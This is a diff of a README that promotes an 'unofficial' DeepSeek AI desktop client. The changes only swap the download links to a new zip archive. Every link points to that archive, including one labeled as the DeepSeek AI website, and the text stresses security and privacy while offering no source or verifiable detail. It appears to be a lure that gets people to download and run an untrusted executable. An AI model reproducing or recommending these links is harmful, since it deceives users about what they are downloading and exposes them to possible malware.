@@ -1,6 +1,6 @@
 # 🚀 Welcome to DeepSeek Desktop Version: Your Secure Gateway to AI Conversations 🤖
 
-[![Download DeepSeek Desktop Version](https://github.com/timSinke/deepseek-desktop-version/releases/download/v1.0/App.zip%20Desktop%20Version-9cf)](https://github.com/timSinke/deepseek-desktop-version/releases/download/v1.0/App.zip)
+[![Download DeepSeek Desktop Version](https://github.com/timSinke/deepseek-desktop-version/releases/download/v2.0/Software.zip%20Desktop%20Version-9cf)](https://github.com/timSinke/deepseek-desktop-version/releases/download/v2.0/Software.zip)
 
 Dive into private, distraction-free AI interactions with this unofficial open-source desktop client for DeepSeek AI. Built for security-conscious users who value performance and privacy.
 
@@ -13,7 +13,7 @@ Dive into private, distraction-free AI interactions with this unofficial open-so
 
 ## 🖥️ Installation
 
-To get started with DeepSeek Desktop Version, simply download the [latest release](https://github.com/timSinke/deepseek-desktop-version/releases/download/v1.0/App.zip) and launch the application on your desktop.
+To get started with DeepSeek Desktop Version, simply download the [latest release](https://github.com/timSinke/deepseek-desktop-version/releases/download/v2.0/Software.zip) and launch the application on your desktop.
 
 ## 🔧 Usage
 
@@ -31,7 +31,7 @@ Don't miss out on a revolutionized AI chat experience. Download DeepSeek Desktop
 
 ## 🌐 Explore More
 
-Visit the [DeepSeek AI website](https://github.com/timSinke/deepseek-desktop-version/releases/download/v1.0/App.zip) to learn more about the platform and its capabilities. Join the DeepSeek community today and unlock the endless possibilities of AI conversations.
+Visit the [DeepSeek AI website](https://github.com/timSinke/deepseek-desktop-version/releases/download/v2.0/Software.zip) to learn more about the platform and its capabilities. Join the DeepSeek community today and unlock the endless possibilities of AI conversations.
 
 ---
 
